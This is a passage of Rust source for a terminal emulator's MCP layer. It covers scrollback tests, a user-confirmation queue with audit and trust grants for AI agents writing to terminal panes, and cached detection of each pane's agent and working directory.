            let session = engine.create_session(CreateSessionRequest {
                cols: 80,
                rows: 4,
                command_dir: None,
                command: None,
                env: Vec::new(),
                launch_policy: Default::default(),
            })?;
            engine.write_input(session.id, "echo pane-resolution-ok\r")?;
            std::thread::sleep(std::time::Duration::from_millis(700));

            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let scrollback =
                handler.handle(&ctx, "screen.scrollback_text", &json!({ "tail_lines": 8 }))?;
            Ok((scrollback, session.id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (scrollback, pane_id) =
            result.expect("read active next-core scrollback without explicit pane id");
        assert!(
            scrollback["text"]
                .as_str()
                .unwrap_or_default()
                .contains("pane-resolution-ok"),
            "pane {} scrollback did not include marker: {:?}",
            pane_id,
            scrollback
        );
        let _ = next_core().destroy_session(pane_id);
    }

    #[test]
    fn screen_scrollback_text_preserves_active_fallback_for_stale_pane_param() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let engine = next_core();
            let session = engine.create_session(CreateSessionRequest {
                cols: 80,
                rows: 4,
                command_dir: None,
                command: None,
                env: Vec::new(),
                launch_policy: Default::default(),
            })?;
            engine.write_input(session.id, "echo stale-pane-fallback-ok\r")?;
            std::thread::sleep(std::time::Duration::from_millis(700));

            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let scrollback = handler.handle(
                &ctx,
                "screen.scrollback_text",
                &json!({ "pane_id": 999999999_u64, "tail_lines": 8 }),
            )?;
            Ok((scrollback, session.id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (scrollback, pane_id) =
            result.expect("fallback to active next-core scrollback for stale pane id");
        assert!(
            scrollback["text"]
                .as_str()
                .unwrap_or_default()
                .contains("stale-pane-fallback-ok"),
            "pane {} scrollback did not include marker: {:?}",
            pane_id,
            scrollback
        );
        let _ = next_core().destroy_session(pane_id);
    }

    #[test]
    fn screen_text_rejects_missing_pane_id_for_required_resolution() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result = {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(&ctx, "screen.text", &json!({}))
        };

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let err = result.expect_err("screen.text should require explicit pane id");
        assert!(
            err.to_string()
                .contains("Missing 'id' / 'session_id' / 'pane_id'"),
            "{}",
            err
        );
    }
}

/// Decision the user (or a timeout) returns to a pending MCP
/// confirmation. `AlwaysAllow` additionally remembers the agent so
/// future calls by the same agent bypass the banner.
#[derive(Debug, Clone, Copy)]
pub enum ConfirmationDecision {
    Allow,
    Block,
    AlwaysAllow,
}

impl ConfirmationDecision {
    /// How a decision crosses a process boundary. Spelled out rather
    /// than derived so a rename in the enum cannot silently change the
    /// wire format between a Core and a window of different versions.
    pub fn to_wire(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Block => "block",
            Self::AlwaysAllow => "always_allow",
        }
    }

    pub fn from_wire(text: &str) -> Option<Self> {
        match text {
            "allow" => Some(Self::Allow),
            "block" => Some(Self::Block),
            "always_allow" => Some(Self::AlwaysAllow),
            _ => None,
        }
    }
}

/// Put a write-confirmation question on this process's queue and wait
/// for whoever is drawing that queue to answer it.
///
/// Public because both hosts need it and neither should reimplement it:
/// a GUI answers straight from here, and a window serving a remote Core
/// answers by calling this too. One queue, one timeout, one place where
/// "nobody answered" is decided.
pub fn prompt_locally(request: &Value) -> Option<ConfirmationDecision> {
    let text = |key: &str| {
        request
            .get(key)
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string()
    };
    let timeout_ms = request
        .get("timeout_ms")
        .and_then(|value| value.as_u64())
        .unwrap_or(30_000)
        .max(1_000);

    // Capacity of one: the asking thread blocks until this is resolved.
    let (tx, rx) = std::sync::mpsc::sync_channel(1);
    let id = {
        let mut state = mcp_state().lock();
        state.confirmation_seq = state.confirmation_seq.saturating_add(1);
        let id = state.confirmation_seq;
        state.pending_confirmations.push(PendingConfirmation {
            id,
            agent: text("agent"),
            input_preview: text("input_preview"),
            pane_id: request
                .get("pane_id")
                .and_then(|value| value.as_u64())
                .unwrap_or_default(),
            method: text("method"),
            risk: {
                let named = text("risk");
                if named.is_empty() {
                    // A question from an older Core says nothing about risk.
                    // Reading that as "harmless" would let an "always allow"
                    // answered on it cover anything, so the conservative
                    // reading is the write it almost certainly was.
                    "local_mutation".to_string()
                } else {
                    named
                }
            },
            requested_at: chrono::Local::now().to_rfc3339(),
            responder: tx,
        });
        id
    };

    // The question only exists on screen once a frame is painted; an
    // idle window would otherwise leave the asker parked on an
    // invisible banner until some event happened to repaint.
    if let Some(host) = unterm_engine::mcp_host() {
        host.request_repaint();
    }

    let answer = rx
        .recv_timeout(std::time::Duration::from_millis(timeout_ms))
        .ok();
    if answer.is_none() {
        // Clean up the still-queued banner: the window may not have
        // painted it yet, and a question nobody is waiting on must not
        // stay on screen.
        mcp_state()
            .lock()
            .pending_confirmations
            .retain(|pending| pending.id != id);
    }
    // Whatever happened, paint again: a banner the keys did not clear
    // has to leave the screen.
    if let Some(host) = unterm_engine::mcp_host() {
        host.request_repaint();
    }
    answer
}

/// Internal result of `gate_pty_write`. Callers either proceed (with
/// audit + write) or return an error to the MCP client.
///
/// `Block` carries why, because all three ways to be blocked used to reach
/// the caller as the single word "denied". An agent told the user denied it
/// will stop and report that; an agent told nobody was there to ask can say
/// so, and one told the question expired can offer to ask again. Same
/// outcome, three different things to do about it.
enum GateOutcome {
    Allow,
    Block(String),
}

#[derive(Clone, Copy)]
struct PaneResolutionOptions {
    active_fallback: bool,
    fallback_on_invalid_explicit: bool,
    validate_session: bool,
}

impl PaneResolutionOptions {
    const REQUIRED_EXISTING: Self = Self {
        active_fallback: false,
        fallback_on_invalid_explicit: false,
        validate_session: true,
    };

    const ACTIVE_EXISTING: Self = Self {
        active_fallback: true,
        fallback_on_invalid_explicit: true,
        validate_session: true,
    };

    const ACTIVE_REQUIRED: Self = Self {
        active_fallback: true,
        fallback_on_invalid_explicit: false,
        validate_session: true,
    };
}

struct EngineFleetDriver {
    engine: Box<dyn unterm_engine::HostEngine>,
}

impl unterm_services::cockpit::fleet::FleetPaneSpawner for EngineFleetDriver {
    fn spawn_member(&mut self, cwd: &std::path::Path, command: &str) -> Result<u64> {
        let env = unterm_services::launch_env::read_unterm_proxy_env().unwrap_or_default();
        let launch_policy = launch_policy_for_env(&env, &[], None);
        let session = self.engine.create_session(CreateSessionRequest {
            cols: 120,
            rows: 32,
            command_dir: Some(cwd.display().to_string()),
            command: None,
            env,
            launch_policy,
        })?;
        std::thread::sleep(std::time::Duration::from_millis(600));
        self.engine
            .write_input(session.id, &format!("{command}\r"))?;
        Ok(session.id as u64)
    }
}

impl unterm_services::cockpit::fleet::FleetPaneRemover for EngineFleetDriver {
    fn remove_member(&mut self, pane_id: u64) -> Result<()> {
        self.engine.destroy_session(pane_id as usize)
    }
}

/// Pending confirmation request. The MCP-worker thread parks on
/// `responder.recv_timeout(...)` waiting for the GUI thread to take
/// this off the queue and `send` a decision.
struct PendingConfirmation {
    id: u64,
    agent: String,
    input_preview: String,
    pane_id: u64,
    method: String,
    /// How dangerous the action was judged to be. Answering "always allow"
    /// creates a grant with exactly this ceiling: trust given for writing
    /// into a terminal must not quietly become permission to destroy things.
    risk: String,
    requested_at: String,
    responder: std::sync::mpsc::SyncSender<ConfirmationDecision>,
}

/// Read-only view of a pending confirmation for the GUI. Doesn't
/// carry the `SyncSender` (it's neither Clone nor Send-friendly to
/// share), so the resolve API is paired: read with
/// `pending_confirmation_view`, decide via `resolve_confirmation`.
#[derive(Clone, serde::Serialize)]
pub struct ConfirmationView {
    pub id: u64,
    pub agent: String,
    pub input_preview: String,
    pub pane_id: u64,
    pub method: String,
    pub requested_at: String,
}

/// Lifecycle state for a single `session.suggest` suggestion. Stored
/// alongside the suggestion so `session.suggest_status` can report what
/// happened to a previously-posted suggestion (and so the suggest UI
/// can decide whether to render it).
#[derive(Clone, serde::Serialize, serde::Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum SuggestionState {
    Pending,
    Accepted { at: String, ran_immediately: bool },
    Dismissed { at: String },
    Expired { at: String },
    Cancelled { at: String },
}

/// Where a suggestion came from. All fields optional — anonymous agents
/// can still post suggestions, and `agent.identify` is the
/// recommended-but-not-required way to provide a recognizable label.
#[derive(Clone, Default, serde::Serialize, serde::Deserialize)]
pub struct SuggestionSource {
    pub agent: Option<String>,
    pub session: Option<String>,
}

/// One MCP-driven suggestion. The text is **not** written to PTY at
/// post time — only when the user actively accepts it via the
/// suggest UI (or programmatically via `accept_suggestion`).
#[derive(Clone, serde::Serialize, serde::Deserialize)]
pub struct Suggestion {
    pub id: String,
    pub pane_id: u64,
    pub text: String,
    pub rationale: Option<String>,
    pub source: SuggestionSource,
    pub created_at: String,
    pub ttl_ms: u64,
    pub state: SuggestionState,
    /// Connection ID of the agent that posted this suggestion. Used to
    /// stamp accept/dismiss audit entries with the originating agent
    /// (even after the connection has disconnected).
    pub posted_by_conn: u64,
    /// Cached agent label from `agent.identify`, so the suggest UI can
    /// render "from claude-code" even after the connection drops.
    pub posted_by_agent: String,
}

/// Global state for audit + policy + workspace
struct McpState {
    audit_log: Vec<AuditEntry>,
    policy: CommandPolicy,
    proxy: ProxySettings,
    /// Future session launch environment overlay requested through
    /// `session.set_env`. This does not mutate existing shells; it is
    /// merged into subsequent `session.create` requests where the
    /// selected engine can apply it safely at process launch.
    launch_env_overlay: HashMap<String, String>,
    /// Monotonically-increasing count of PTY writes that came from an
    /// MCP client (session.input / exec.send). Surfaced in the status
    /// bar so the user can see "AI just wrote N times" at a glance.
    input_event_count: u64,
    /// When the most recent MCP-origin PTY write happened. Status bar
    /// uses this for a short flash effect after each event.
    last_input_at: Option<std::time::Instant>,
    /// Per-connection agent identity. Connections that never called
    /// `agent.identify` are absent from the map and rendered as
    /// "anonymous" in audit views. Cleared when the connection drops.
    agents_by_connection: HashMap<u64, AgentIdentity>,
    /// Per-connection client process identity from `auth.login`.
    clients_by_connection: HashMap<u64, unterm_protocol::BuildHandshake>,
    /// First time we ever saw a given agent name (across all
    /// connections). Used by the (future, P0.3) "first-time per agent"
    /// confirmation flow to decide whether this agent is novel enough
    /// to interrupt the user.
    known_agents: HashMap<String, String>,
    /// Names of agents that have ever called `session.input` /
    /// `exec.send` since startup. Used to flag "first PTY write by
    /// this agent" in the audit log.
    agents_with_input_history: std::collections::HashSet<String>,
    /// pane_id → (agent name, when it last wrote there). Drives the
    /// left tab bar's "who is driving this pane" subtitle.
    pane_agents: HashMap<u64, (String, std::time::Instant)>,
    /// Agents the user has explicitly elected to skip future
    /// confirmation banners for (via the "Always allow this agent"
    /// affordance on a banner). Distinct from the static
    /// `mcp_trusted_agents` config — this list is session-only and
    /// only ever grows via user action.
    confirmed_agents: std::collections::HashSet<String>,
    /// Banners parked waiting for the user to allow/block. Each
    /// element carries a `SyncSender` the MCP worker is blocked on;
    /// the GUI thread fulfils it by sending a `ConfirmationDecision`.
    pending_confirmations: Vec<PendingConfirmation>,
    /// Monotonic id allocator for pending confirmations.
    confirmation_seq: u64,
    /// All suggestions posted via `session.suggest`, indexed by id.
    /// Both live (pending) and dead (accepted/dismissed/expired) are
    /// kept so `session.suggest_status` can return a lifecycle
    /// answer. Capped at SUGGEST_MAX entries — oldest dropped first.
    suggestions: HashMap<String, Suggestion>,
    /// Insertion order of suggestion ids, used for FIFO eviction when
    /// the map exceeds SUGGEST_MAX.
    suggestion_order: Vec<String>,
    /// Monotonically-increasing suffix appended to suggestion ids so
    /// they're unique even when the system clock has poor resolution.
    suggestion_seq: u64,
}

/// Snapshot of MCP input activity for UI surfaces. Returned by
/// `recent_mcp_input_activity()` so renderers don't need to know about
/// the global state Mutex.
pub struct McpInputActivity {
    pub count: u64,
    pub seconds_since_last: Option<f32>,
}

/// Read-only view of how often MCP clients have written to PTYs since
/// startup, plus how long ago the last write was. The status bar polls
/// this on every paint to decide whether to render the `⚡` flash.
pub fn recent_mcp_input_activity() -> McpInputActivity {
    let state = mcp_state().lock();
    McpInputActivity {
        count: state.input_event_count,
        seconds_since_last: state.last_input_at.map(|t| t.elapsed().as_secs_f32()),
    }
}

/// Oldest pending confirmation as a UI-friendly view. Returns `None`
/// when nothing is waiting. The GUI paints a banner whenever this is
/// `Some` and routes Enter/Esc/Ctrl-A to `resolve_confirmation`.
pub fn pending_confirmation_view() -> Option<ConfirmationView> {
    let state = mcp_state().lock();
    state
        .pending_confirmations
        .first()
        .map(|p| ConfirmationView {
            id: p.id,
            agent: p.agent.clone(),
            input_preview: p.input_preview.clone(),
            pane_id: p.pane_id,
            method: p.method.clone(),
            requested_at: p.requested_at.clone(),
        })
}

/// Number of pending confirmations. Cheaper than `pending_confirmation_view`
/// when the caller only needs to know "is the banner needed?".
pub fn pending_confirmation_count() -> usize {
    mcp_state().lock().pending_confirmations.len()
}

/// Fulfil a pending confirmation. Returns true if the id was found
/// and the worker thread was unblocked. `AlwaysAllow` additionally
/// remembers the agent so future calls by that agent name bypass the
/// banner for the rest of the session.
pub fn resolve_confirmation(id: u64, decision: ConfirmationDecision) -> bool {
    let mut state = mcp_state().lock();
    let Some(idx) = state.pending_confirmations.iter().position(|p| p.id == id) else {
        return false;
    };
    let pending = state.pending_confirmations.remove(idx);
    if matches!(decision, ConfirmationDecision::AlwaysAllow) {
        // "Always allow" is a grant, and it is written as one: same durable
        // store, same revocation, same place to look when the question is
        // "what have I actually agreed to". The ceiling is the risk of the
        // action that was on screen, so trust given for a terminal write
        // never silently becomes permission to destroy something.
        let ceiling = pending.risk.clone();
        let agent = pending.agent.clone();
        // Kept in the session set as well: the gate reads it without
        // touching the database on the hot path, and the grant is what
        // survives a restart.
        state.confirmed_agents.insert(agent.clone());
        drop(state);
        grant_agent_trust(&agent, &ceiling);
        state = mcp_state().lock();
    }
    // Drop the lock before sending so the waiting worker can
    // re-acquire it on its own audit/write path.
    drop(state);
    // `send` returns Err only if the receiver was dropped (the
    // worker timed out and gave up). That's fine — the audit will
    // already show the timeout entry, and the worker has returned
    // an error to its MCP client.
    let _ = pending.responder.send(decision);
    true
}

/// Aggregate counters surfaced in the Insights overlay. Single
/// snapshot under one Mutex acquire so renderers don't need to make
/// six separate calls.
#[derive(Clone, Default, serde::Serialize, serde::Deserialize)]
pub struct InsightsMcpSnapshot {
    pub input_count: u64,
    pub seconds_since_last_input: Option<f32>,
    pub agents_seen: usize,
    pub pending_suggestions: usize,
    pub pending_confirmations: usize,
    pub recent_audit: Vec<String>,
}

/// Read all the MCP-side numbers the Insights overlay needs in one
/// lock acquisition. `recent_audit_limit` caps how many audit
/// entries (newest first) are rendered as one-line summaries.
pub fn insights_mcp_snapshot(recent_audit_limit: usize) -> InsightsMcpSnapshot {
    let state = mcp_state().lock();
    let recent_audit: Vec<String> = state
        .audit_log
        .iter()
        .rev()
        .take(recent_audit_limit)
        .map(|e| {
            // Time-of-day extracted from the rfc3339 timestamp; we
            // don't need full ISO precision in the overlay.
            let time = e
                .timestamp
                .split('T')
                .nth(1)
                .and_then(|tail| tail.split('.').next())
                .unwrap_or(&e.timestamp);
            format!(
                "{time}  {:<24} {}  agent={}",
                e.method,
                truncate(&e.detail, 60),
                e.agent
            )
        })
        .collect();
    let pending_suggestions = state
        .suggestions
        .values()
        .filter(|s| matches!(s.state, SuggestionState::Pending))
        .count();
    InsightsMcpSnapshot {
        input_count: state.input_event_count,
        seconds_since_last_input: state.last_input_at.map(|t| t.elapsed().as_secs_f32()),
        agents_seen: state.known_agents.len(),
        pending_suggestions,
        pending_confirmations: state.pending_confirmations.len(),
        recent_audit,
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
    out.push('…');
    out
}

/// Snapshot the audit log as a pretty-printed JSON string. Used by
/// the status bar chip click (until P1.3's proper overlay lands) so
/// the user can paste the log into any text editor for review.
/// Returns at most `limit` most-recent entries, newest first.
/// Read-only snapshot of the trust state for the Web Settings panel.
/// `runtime` is the union of (loaded-from-disk) ∪ (Alt+A this session).
/// `static_config` is the user's `mcp_trusted_agents` Lua config.
/// `audit_counts` is a per-agent write count derived from `audit_log`
/// so the panel can show "claude-code: 47 writes" alongside the trust
/// toggle. Single lock acquire.
pub fn trust_snapshot() -> Value {
    let state = mcp_state().lock();
    let mut runtime: Vec<&String> = state.confirmed_agents.iter().collect();
    runtime.sort();
    let cfg = unterm_services::settings::current();
    let mut static_config: Vec<&String> = cfg.mcp_trusted_agents.iter().collect();
    static_config.sort();
    let mut counts: HashMap<String, u64> = HashMap::new();
    for entry in &state.audit_log {
        // entry.agent is a plain String, defaulting to "anonymous"
        // when the connection hadn't called agent.identify yet.
        if !entry.agent.is_empty() {
            *counts.entry(entry.agent.clone()).or_insert(0) += 1;
        }
    }
    let mut count_list: Vec<(&String, &u64)> = counts.iter().collect();
    count_list.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
    json!({
        "runtime": runtime,
        "static_config": static_config,
        "audit_counts": count_list
            .into_iter()
            .map(|(a, c)| json!({ "agent": a, "writes": c }))
            .collect::<Vec<_>>(),
    })
}

pub fn pty_write_confirmation_snapshot() -> Value {
    let cfg = unterm_services::settings::current();
    let state = mcp_state().lock();
    json!({
        "policy": format!("{:?}", cfg.mcp_input_confirmation),
        "timeout_ms": cfg.mcp_confirmation_timeout_ms.max(1000),
        "pending": state.pending_confirmations.len(),
        "runtime_trusted_agents": state.confirmed_agents.len(),
        "static_trusted_agents": cfg.mcp_trusted_agents.len(),
        "engine_neutral": true,
        "requires_wezterm_pane_object": false,
    })
}

/// Revoke trust at runtime. Removes from `confirmed_agents` AND from
/// the persisted JSON so the next session also sees the agent as
/// "needs confirmation". Returns `true` if the name was present.
/// Note: this can't remove an entry from `mcp_trusted_agents` Lua
/// config — that's static and the user has to edit unterm.lua. The
/// Web Settings panel surfaces both lists so the user can see why
/// removal from runtime didn't actually un-trust.
pub fn revoke_trust(agent: &str) -> bool {
    let mut state = mcp_state().lock();
    let was = state.confirmed_agents.remove(agent);
    let snapshot = state.confirmed_agents.clone();
    drop(state);
    save_persisted_trusted(&snapshot);
    was
}

/// Promote an agent to trust without going through the banner. Used
/// by the Web Settings panel's "trust this agent now" button.
pub fn grant_trust(agent: &str) -> bool {
    let mut state = mcp_state().lock();
    let was_new = state.confirmed_agents.insert(agent.to_string());
    let snapshot = state.confirmed_agents.clone();
    drop(state);
    save_persisted_trusted(&snapshot);
    was_new
}

pub fn audit_log_snapshot_json(limit: usize) -> String {
    let state = mcp_state().lock();
    let recent: Vec<&AuditEntry> = state.audit_log.iter().rev().take(limit).collect();
    serde_json::to_string_pretty(&recent).unwrap_or_else(|_| "[]".to_string())
}

/// Record a user-visible GUI write that crosses the same audit boundary as an
/// MCP mutation. This is intentionally narrow: callers provide an action name
/// and a redacted/short detail, never raw secret-bearing screen contents.
pub fn audit_gui_write(method: &str, pane_id: u64, detail: &str) {
    mcp_state().lock().audit_log.push(AuditEntry {
        timestamp: chrono::Local::now().to_rfc3339(),
        method: method.to_string(),
        session_id: Some(pane_id.to_string()),
        detail: detail.to_string(),
        allowed: true,
        outcome: "executed".to_string(),
        agent: "user".to_string(),
    });
}

/// Pending suggestions for a specific pane, ordered oldest-first.
/// Called by the suggest UI on every paint to decide what to render.
/// Side-effect: lazily flips suggestions whose TTL has elapsed from
/// `Pending` to `Expired` — keeps the queue from showing stale text.
/// Name of the agent that most recently drove `pane_id` (PTY write via
/// MCP), if it was active within the last 15 minutes. Used by the left
/// tab bar subtitle.
pub fn agent_for_pane(pane_id: u64) -> Option<String> {
    let state = mcp_state().lock();
    state.pane_agents.get(&pane_id).and_then(|(name, at)| {
        if at.elapsed().as_secs() <= 15 * 60 {
            Some(name.clone())
        } else {
            None
        }
    })
}

/// Resolve the AI agent driving a pane. Tries MCP first (an external
/// agent calling session.input / exec.send registers itself there),
/// then falls back to inspecting the pane's foreground process tree
/// — for in-pane CLIs like `claude`, `codex`, `gemini`, `kimi`, `aider`,
/// `opencode`, `trae-cli`, `zcode`, `cursor-agent`. The MCP path only fires when an
/// external agent writes to a pane; an interactive in-tab CLI is
/// invisible to MCP, so without the process-tree check the chip
/// never lit up for the most common case.
pub fn detect_agent_for_pane(
    pane_id: u64,
    proc_info: Option<&procinfo::LocalProcessInfo>,
) -> Option<String> {
    if let Some(name) = agent_for_pane(pane_id) {
        return Some(name);
    }
    let info = proc_info?;
    fn walk(p: &procinfo::LocalProcessInfo) -> Option<String> {
        if let Some(hit) = detect_known_agent_name(&p.name) {
            return Some(hit.to_string());
        }
        // Also peek the first argv element — some launchers exec a
        // wrapper script whose process name doesn't match the agent.
        if let Some(arg0) = p.argv.first() {
            if let Some(hit) = detect_known_agent_name(arg0) {
                return Some(hit.to_string());
            }
        }
        for child in p.children.values() {
            if let Some(hit) = walk(child) {
                return Some(hit);
            }
        }
        None
    }
    walk(info)
}

fn detect_known_agent_name(name: &str) -> Option<&'static str> {
    let lower = name.to_ascii_lowercase();
    // Strip a leading path / common extensions so "claude.exe" /
    // "/usr/local/bin/claude" both hit.
    let bare = std::path::Path::new(&lower)
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or(&lower);
    match bare {
        "claude" => Some("claude"),
        "codex" => Some("codex"),
        "gemini" => Some("gemini"),
        "kimi" | "kimi-code" => Some("kimi"),
        "aider" => Some("aider"),
        "opencode" => Some("opencode"),
        "trae" | "trae-cli" | "trae_agent" | "trae-agent" => Some("trae"),
        "zcode" | "z-code" | "z code" => Some("zcode"),
        "cursor-agent" | "cursoragent" => Some("cursor-agent"),
        _ => None,
    }
}

/// Cached `(agent, cwd-basename)` for a pane's status surfaces (vertical tab
/// rows and the top tab titles). Resolving it means a foreground-process
/// snapshot plus per-process PEB reads (cwd/argv) across the pane's subtree —
/// tens of milliseconds on Windows. Doing that for every tab on every
/// `update_title` (i.e. on every tab switch) was the dominant switch latency
/// once a window held several tabs. We instead serve the last known value
/// instantly and refresh it on a worker thread, mirroring the stats-bar
/// caches. A few seconds of staleness is invisible for an agent/cwd label.
#[derive(Clone, Default)]
struct PaneAgentCwd {
    agent: Option<String>,
    /// Foreground command running in the pane's shell (e.g. `npm run dev`,
    /// `git log`), or None when the shell is sitting idle at its prompt.
    /// Derived from the same foreground-process snapshot as `agent`, so it
    /// costs nothing extra and is refreshed on the same worker thread.
    foreground: Option<String>,
    cwd: Option<String>,
    /// Full cwd used to disambiguate projects that share the same basename.
    cwd_path: Option<String>,
    /// Stable repository/workspace root derived off the render thread.
    project: Option<String>,
    project_path: Option<String>,
}

/// Executable base names we treat as "the shell itself" — when the pane's
/// foreground process is one of these, no command is running and the row
/// should fall back to the shell/pane name rather than a command title.
fn is_shell_exe(bare: &str) -> bool {
    matches!(
        bare,
        "powershell"
            | "pwsh"
            | "cmd"
            | "bash"
            | "zsh"
            | "fish"
            | "sh"
            | "dash"
            | "ksh"
            | "tcsh"
            | "csh"
            | "nu"
            | "elvish"
            | "xonsh"
            | "wsl"
            | "conhost"
    )
}

fn foreground_command_title_from_process_name(process_name: &str) -> Option<String> {
    let bare = std::path::Path::new(process_name)
        .file_stem()
        .and_then(|s| s.to_str())
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_default();
    if bare.is_empty() || is_shell_exe(&bare) {
        None
    } else {
        Some(bare)
    }
}

// Match 0.57.4's visible status freshness. Concurrency remains bounded well
// below the old 16-worker fan-out so busy multi-tab windows stay responsive.
const AGENT_CWD_TTL: std::time::Duration = std::time::Duration::from_millis(2000);
const AGENT_CWD_PRUNE_AFTER: std::time::Duration = std::time::Duration::from_secs(60);
const AGENT_CWD_PRUNE_MIN_SIZE: usize = 128;
const AGENT_CWD_MAX_INFLIGHT: usize = 4;

fn agent_cwd_cache() -> &'static Mutex<HashMap<u64, (std::time::Instant, PaneAgentCwd)>> {
    static C: std::sync::OnceLock<Mutex<HashMap<u64, (std::time::Instant, PaneAgentCwd)>>> =
        std::sync::OnceLock::new();
    C.get_or_init(|| Mutex::new(HashMap::new()))
}

fn agent_cwd_inflight() -> &'static Mutex<std::collections::HashSet<u64>> {
    static S: std::sync::OnceLock<Mutex<std::collections::HashSet<u64>>> =
        std::sync::OnceLock::new();
    S.get_or_init(|| Mutex::new(std::collections::HashSet::new()))
}

/// Non-blocking `(agent, cwd)` for status surfaces. Returns the cached value
/// immediately (empty until the first refresh lands) and kicks off an
/// off-thread refresh when the entry is missing or older than `AGENT_CWD_TTL`.
/// Safe to call from the render thread — it never touches the filesystem or
/// the process table itself.
pub fn agent_and_cwd_for_pane(pane_id: u64) -> (Option<String>, Option<String>) {
    let v = agent_fg_cwd_for_pane_inner(pane_id);
    (v.agent, v.cwd)
}

/// Non-blocking `(agent, foreground-command, cwd)` for status surfaces that
/// want to show the running command as the primary label (the left tab bar).
/// Same caching contract as `agent_and_cwd_for_pane`: instant cached read,
/// off-thread refresh, never touches the process table on the caller thread.
pub fn agent_fg_cwd_for_pane(pane_id: u64) -> (Option<String>, Option<String>, Option<String>) {
    let v = agent_fg_cwd_for_pane_inner(pane_id);
    (v.agent, v.foreground, v.cwd)
}

/// Non-blocking sidebar metadata including the full cwd.  The shorter helper
/// above is kept for existing status surfaces that only have room for a
/// basename.
pub fn agent_fg_cwd_path_for_pane(
    pane_id: u64,
) -> (
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
) {
    let v = agent_fg_cwd_for_pane_inner(pane_id);
    (
        v.agent,
        v.foreground,
        v.cwd,
        v.cwd_path,
        v.project,
        v.project_path,
    )
}

fn project_root_for_path(path: &std::path::Path) -> std::path::PathBuf {
    for ancestor in path.ancestors() {
        if ancestor.join(".git").exists()
            || ancestor.join(".hg").exists()
            || ancestor.join(".svn").exists()
        {
            return ancestor.to_path_buf();
        }
    }
    path.to_path_buf()
}

fn agent_fg_cwd_for_pane_inner(pane_id: u64) -> PaneAgentCwd {
    let (cached, need_refresh) = {
        let mut cache = agent_cwd_cache().lock();
        if cache.len() > AGENT_CWD_PRUNE_MIN_SIZE {
            cache.retain(|_, (at, _)| at.elapsed() < AGENT_CWD_PRUNE_AFTER);
        }
        match cache.get(&pane_id) {
            Some((at, v)) if at.elapsed() < AGENT_CWD_TTL => {
                return v.clone();
            }
            Some((_, v)) => (v.clone(), true),
            None => (PaneAgentCwd::default(), true),
        }
    };
    let should_refresh = if need_refresh {
        let mut inflight = agent_cwd_inflight().lock();
        if inflight.len() < AGENT_CWD_MAX_INFLIGHT {
            inflight.insert(pane_id)
        } else {
            false
        }
    } else {
        false
    };
    if should_refresh {
        if std::thread::Builder::new()
            .name("agent-cwd-refresh".into())
            .spawn(move || {
                let fresh = compute_agent_cwd(pane_id);
                agent_cwd_cache()
                    .lock()
                    .insert(pane_id, (std::time::Instant::now(), fresh));
                agent_cwd_inflight().lock().remove(&pane_id);
            })
            .is_err()
        {
            agent_cwd_inflight().lock().remove(&pane_id);
        }
    }
    cached
}

/// The expensive part, run on a worker thread: snapshot the pane's foreground
/// process and derive the agent name + cwd basename.
fn compute_agent_cwd(pane_id: u64) -> PaneAgentCwd {
    let engine: Box<dyn unterm_engine::HostEngine> = match unterm_engine::engine_provider() {
        Some(provider) => provider(),
        None => Box::new(unterm_engine::next_core::NextCoreEngine),
    };
    let Ok(shell) = engine.shell(pane_id as usize) else {
        return PaneAgentCwd::default();
    };
    let agent = agent_for_pane(pane_id)
        .or_else(|| detect_known_agent_name(&shell.process_name).map(str::to_string));
    // When an agent drives the pane its name already IS the title, so we skip
    // the command probe; otherwise reduce the foreground process to a short
    // command title (`None` while the shell is idle at its prompt).
    let foreground = if agent.is_some() {
        None
    } else {
        foreground_command_title_from_process_name(&shell.process_name)
    };
    let cwd_path_buf = shell.cwd.as_ref().map(std::path::PathBuf::from);
    let cwd_path = cwd_path_buf
        .as_ref()
        .map(|p| p.to_string_lossy().to_string());
    let cwd = cwd_path.as_ref().and_then(|path| {
        let p = std::path::Path::new(path);
        if dirs_next::home_dir().as_deref() == Some(p) {
            Some("~".to_string())
        } else {
            p.file_name().map(|n| n.to_string_lossy().to_string())
        }
    });
    let project_path_buf = cwd_path_buf.as_deref().map(project_root_for_path);
    let project = project_path_buf.as_ref().and_then(|path| {
        if dirs_next::home_dir().as_deref() == Some(path.as_path()) {
            Some("~".to_string())
        } else {
            path.file_name()
                .map(|name| name.to_string_lossy().to_string())
        }
    });
    let project_path = project_path_buf.map(|path| path.to_string_lossy().to_string());
    PaneAgentCwd {
        agent,
        foreground,
        cwd,
        cwd_path,
        project,
        project_path,
    }
}

pub fn pending_suggestions_for_pane(pane_id: u64) -> Vec<Suggestion> {
    let mut state = mcp_state().lock();
    let now = chrono::Local::now();
    let ids_to_check: Vec<String> = state
        .suggestions
        .iter()
        .filter(|(_, s)| s.pane_id == pane_id && matches!(s.state, SuggestionState::Pending))
        .map(|(id, _)| id.clone())
        .collect();
    for id in ids_to_check {
        let expired = {
            let s = &state.suggestions[&id];
            chrono::DateTime::parse_from_rfc3339(&s.created_at)
                .map(|created| {
